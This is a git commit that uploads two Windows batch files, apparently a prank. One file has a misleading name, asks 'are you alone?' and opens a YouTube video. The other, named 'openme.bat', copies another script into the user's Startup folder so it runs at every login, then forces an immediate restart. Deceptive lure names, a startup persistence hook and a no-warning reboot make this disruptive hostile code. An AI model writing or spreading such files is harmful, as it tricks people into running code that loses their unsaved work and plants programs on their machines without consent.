c3d5fb29ac99fd8a338408feeeb50063b36c269d
TotallyG0DLY <kilian911.o@gmail.com>
2025-01-14 17:32:34 +0000

    Add files via upload

---
+++ Boiled one/DO NOT OPEN YET THIS IS A EXTENSION!.bat
@@ -0,0 +1,9 @@
+ÿþ
+cls
+@echo off
+
+set /p a=are you alone?
+
+start chrome "https://www.youtube.com/watch?v=ow0tYugUbz0"
+
+exit
---
+++ Boiled one/openme.bat
@@ -0,0 +1,11 @@
+ÿþ
+cls
+@echo off
+rem Set source and destination paths
+set source="C:\Users\%USERNAME%\Desktop\Normal\test.bat"
+set destination="C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
+rem Move the file to the Startup folder
+move %source% %destination%
+
+shutdown /r /t 0
